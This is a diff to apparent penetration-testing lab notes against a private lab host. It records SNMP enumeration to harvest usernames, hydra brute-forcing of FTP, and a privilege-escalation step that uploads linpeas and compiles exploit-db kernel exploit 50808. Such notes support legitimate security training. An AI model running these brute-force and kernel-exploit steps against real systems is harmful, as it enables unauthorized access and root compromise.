@@ -152,6 +152,8 @@ snmp-check 192.168.211.149 -c public
 snmpwalk -c public -v1 -t 10 192.168.211.149
 snmpwalk -c public -v2c -t 10 192.168.211.149
 
+# need to do this to get the usernames john and kiero
+# then try combos of john and kiero against the ftp server, wordlists don't work
 snmpwalk -c public -v1 -t 10 192.168.211.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
 nmap --script "snmp* and not snmp-brute" 192.168.211.149
 
@@ -159,4 +161,35 @@ hydra -l kiero -P /usr/share/seclists/Passwords/Default-Credentials/default-pass
 
 hydra -l kiero -P probable-v2-top12000.txt 192.168.211.149 ftp
 
+```
+
+.149 privesc
+```
+scp -i id_rsa linpeas.sh john@192.168.211.149:/home/john
+
+# get linux kernel version
+uname -a
+# discover 5.9.0-050900-generic and look up "linux kernel 5.9.0"
+# find this: https://www.exploit-db.com/exploits/50808
+
+gcc -o 50808 50808.c
+
+scp -i id_rsa 50808 john@192.168.211.149:/home/john
+
+
+# create exploit files and copy to container root 
+sudo su -
+cd /home/kali/lab2
+cp exp.c /var/lib/machines/xen-test/root/
+
+
+cd /var/lib/machines/xen-test/root
+sudo systemd-nspawn -M xen-test
+
+# compile exploit in container
+
+gcc -o exp exp.c
+
+# copy back to lab folder
+cp exp /home/kali/lab2/
 ```
